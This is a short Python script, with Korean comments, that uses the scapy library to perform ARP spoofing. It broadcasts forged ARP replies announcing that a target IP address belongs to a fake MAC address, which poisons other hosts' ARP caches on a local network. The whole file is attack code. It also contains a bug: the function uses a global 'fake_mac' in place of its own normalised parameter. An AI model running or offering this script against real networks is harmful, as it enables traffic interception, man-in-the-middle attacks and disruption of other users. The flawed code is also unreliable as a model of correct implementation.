from scapy.all import Ether, ARP, sendp

def mac_hyphen_to_colon(mac):
    return mac.replace("-", ":").lower()

def arp_spoof(target_ip, spoof_mac, iface="Wi-Fi"):
    spoof_mac = mac_hyphen_to_colon(spoof_mac)
    # 브로드캐스트 MAC 주소 (패킷의 Ethernet 목적지)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp = ARP(
        op=2,           # ARP Reply
        psrc=target_ip, # 속일 IP
        hwsrc=fake_mac # 속일 MAC
    )
    packet = ether / arp
    print(f"[+] Sending ARP spoof packet: {target_ip} is-at {spoof_mac}")
    sendp(packet, iface=iface, count=5)

if __name__ == "__main__":
    target_ip = "xx.xx.xx.xx"
    fake_mac = "00-11-22-33-44-55"
    network_iface = "Wi-Fi"

    arp_spoof(target_ip, fake_mac, iface=network_iface)
